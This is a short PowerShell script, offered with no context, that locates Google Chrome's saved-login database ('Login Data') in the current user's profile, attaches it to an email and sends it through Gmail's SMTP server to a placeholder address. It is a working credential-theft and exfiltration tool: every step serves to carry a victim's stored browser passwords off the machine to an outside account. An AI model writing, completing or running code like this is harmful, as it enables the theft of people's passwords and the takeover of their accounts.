# Define email parameters
$smtpServer = "smtp.gmail.com"
$smtpFrom = "YOUR EMAIL"
$smtpTo = "YOUR EMAIL"
$messageSubject = "file"
$messageBody = "Success!"
$attachmentPath = [System.IO.Path]::Combine($env:USERPROFILE, "AppData\Local\Google\Chrome\User Data\Default\Login Data")

# Create the mail message
$mailMessage = New-Object system.net.mail.mailmessage
$mailMessage.from = $smtpFrom
$mailMessage.To.Add($smtpTo)
$mailMessage.Subject = $messageSubject
$mailMessage.Body = $messageBody

# Add the attachment
$attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
$mailMessage.Attachments.Add($attachment)

# Define SMTP client and send the email
$smtpClient = New-Object Net.Mail.SmtpClient($smtpServer, 587) # Use port 587 for TLS
$smtpClient.EnableSsl = $true
$smtpClient.Credentials = New-Object System.Net.NetworkCredential("YOUR EMAIL", "YOUR PASSWORD")
$smtpClient.Send($mailMessage)

# Clean up
$attachment.Dispose()
$mailMessage.Dispose()